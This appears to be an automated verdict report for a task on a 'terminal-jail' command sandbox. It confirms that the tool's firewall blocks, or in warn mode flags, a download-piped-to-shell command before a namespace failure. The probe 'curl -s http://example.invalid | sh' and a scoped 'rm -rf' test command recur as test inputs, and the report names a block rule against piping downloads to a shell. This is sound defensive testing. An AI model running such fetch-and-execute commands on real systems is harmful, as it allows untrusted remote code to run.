# Verdict: TJ-DF-016

**Task:** Premise-false verification: warn mode on DEGRADED hosts does NOT die silent — firewall verdict prints before the namespace failure
**Evaluated:** 2026-09-15T18:21:08.314619
**Result:** ✓ PASS

## Pipeline Stages

- ✓ **tier1**
  -   ✓ lint: 
  ✓ secrets: [90m1:20PM[0m [32mINF[0m [1mscanned ~3340333 bytes (3.34 MB) in 275ms[0m
[90m1:20PM[0m [32m
  ✓ tests: ============================= test session starts ==============================
platform linux -- P
- ✓ **tier2**
  - COMPLETE
  ✓ plugin/terminal_jail/interruptor_bridge.py returns action=block rule_id=builtin-curl-pipe-shell for 'curl -s http://example.invalid | sh' and action=allow with empty rule_id for 'rm -rf /tmp/tj-probe-016': Live run: `echo '{"command": "curl -s http://example.invalid | sh"}' | python3 plugin/terminal_jail/interruptor_bridge.py` -> {"action": "block", "command": "curl -s http://example.invalid | sh", "modified": null, "rule_id": "builtin-curl-pipe-shell", "reason": "Piping downloads directly to a shell is blocked..."} rc=0. Second run with 'rm -rf /tmp/tj-probe-016' -> {"action": "allow", "rule_id": null, "reason": ""} rc=0. Rule defined at plugin/terminal_jail/rules/00-builtins.yaml:121.
  ✓ standalone/terminal-jail evaluates the interruptor (firewall) block BEFORE the namespace preflight: the WARN line appears on stderr ahead of the namespace-failure line: standalone/terminal-jail: interruptor evaluation block at lines 178-266 precedes the namespace preflight at lines 359-371. Live stderr order confirmed: line 1 = 'terminal-jail: WARNING — [WARN MODE] Would have blocked: Piping downloads directly to a shell is blocked...', line 2 = 'terminal-jail: namespace creation failed (unshare exit 1); command not run — on unprivileged hosts try --user'.
  ✓ live: TERMINAL_JAIL_INTERRUPTOR_MODE=warn <cli> bash -c 'curl -s http://example.invalid | sh' prints 'WARNING - [WARN MODE] Would have blocked' on stderr on this DEGRADED host (grep count 1) and the command is not run (rc=2): Live: `TERMINAL_JAIL_INTERRUPTOR_MODE=warn ./standalone/terminal-jail bash -c 'curl -s http://example.invalid | sh'` -> rc=2; stderr grep -c 'Would have blocked' = 1 and grep -c 'WARNING' = 1 (single line: 'terminal-jail: WARNING — [WARN MODE] Would have blocked: ...'). Command not run (namespace preflight exit 2). Host confirmed DEGRADED: `unshare --pid --fork --kill-child=SIGKILL true` -> rc=1 'unshare failed: Operation not permitted'.
  ✓ live control: the same command in enforce mode exits 126 with the COMMAND BLOCKED box and rule builtin-curl-pipe-shell: Live: `TERMINAL_JAIL_INTERRUPTOR_MODE=enforce ./standalone/terminal-jail bash -c 'curl -s http://example.invalid | sh'` -> rc=126; stderr shows the box: '+---...---+' / '|  COMMAND BLOCKED — builtin-curl-pipe-shell' / '|  Rule: builtin-curl-pipe-shell'.
  ✓ no repository code change is claimed — board-only premise closure: `git diff HEAD --stat` shows only '.gitreins/tasks.yaml | 3 ++-' (status: in_progress -> complete, +completed_at). No source files modified. Regression suite `pytest -x --tb=short` -> '348 passed, 14 skipped in 9.58s' (exit 0).


## Summary

Judge Result: TJ-DF-016

Stage tier1: PASS
    ✓ lint: 
  ✓ secrets: [90m1:20PM[0m [32mINF[0m [1mscanned ~3340333 bytes (3.34 MB) in 275ms[0m
[90m1:20PM[0m [32m
  ✓ tests: ============================= test session starts ==============================
platform linux -- P

Stage tier2: PASS
  COMPLETE
  ✓ plugin/terminal_jail/interruptor_bridge.py returns action=block rule_id=builtin-curl-pipe-shell for 'curl -s http://example.invalid | sh' and action=allow with empty rule_id for 'rm -rf /tmp/tj-probe-016': Live run: `echo '{"command": "curl -s http://example.invalid | sh"}' | python3 plugin/terminal_jail/interruptor_bridge.py` -> {"action": "block", "command": "curl -s http://example.invalid | sh", "modified": null, "rule_id": "builtin-curl-pipe-shell", "reason": "Piping downloads directly to a shell is blocked..."} rc=0. Second run with 'rm -rf /tmp/tj-probe-016' -> {"action": "allow", "rule_id": null, "reason": ""} rc=0. Rule defined at plugin/terminal_jail/rules/00-builtins.yaml:121.
  ✓ standalone/terminal-jail evaluates the interruptor (firewall) block BEFORE the namespace preflight: the WARN line appears on stderr ahead of the namespace-failure line: standalone/terminal-jail: interruptor evaluation block at lines 178-266 precedes the namespace preflight at lines 359-371. Live stderr order confirmed: line 1 = 'terminal-jail: WARNING — [WARN MODE] Would have blocked: Piping downloads directly to a shell is blocked...', line 2 = 'terminal-jail: namespace creation failed (unshare exit 1); command not run — on unprivileged hosts try --user'.
  ✓ live: TERMINAL_JAIL_INTERRUPTOR_MODE=warn <cli> bash -c 'curl -s http://example.invalid | sh' prints 'WARNING - [WARN MODE] Would have blocked' on stderr on this DEGRADED host (grep count 1) and the command is not run (rc=2): Live: `TERMINAL_JAIL_INTERRUPTOR_MODE=warn ./standalone/terminal-jail bash -c 'curl -s http://example.invalid | sh'` -> rc=2; stderr grep -c 'Would have blocked' = 1 and grep -c 'WARNING' = 1 (single line: 'terminal-jail: WARNING — [WARN MODE] Would have blocked: ...'). Command not run (namespace preflight exit 2). Host confirmed DEGRADED: `unshare --pid --fork --kill-child=SIGKILL true` -> rc=1 'unshare failed: Operation not permitted'.
  ✓ live control: the same command in enforce mode exits 126 with the COMMAND BLOCKED box and rule builtin-curl-pipe-shell: Live: `TERMINAL_JAIL_INTERRUPTOR_MODE=enforce ./standalone/terminal-jail bash -c 'curl -s http://example.invalid | sh'` -> rc=126; stderr shows the box: '+---...---+' / '|  COMMAND BLOCKED — builtin-curl-pipe-shell' / '|  Rule: builtin-curl-pipe-shell'.
  ✓ no repository code change is claimed — board-only premise closure: `git diff HEAD --stat` shows only '.gitreins/tasks.yaml | 3 ++-' (status: in_progress -> complete, +completed_at). No source files modified. Regression suite `pytest -x --tb=short` -> '348 passed, 14 skipped in 9.58s' (exit 0).


Overall: PASS ✓
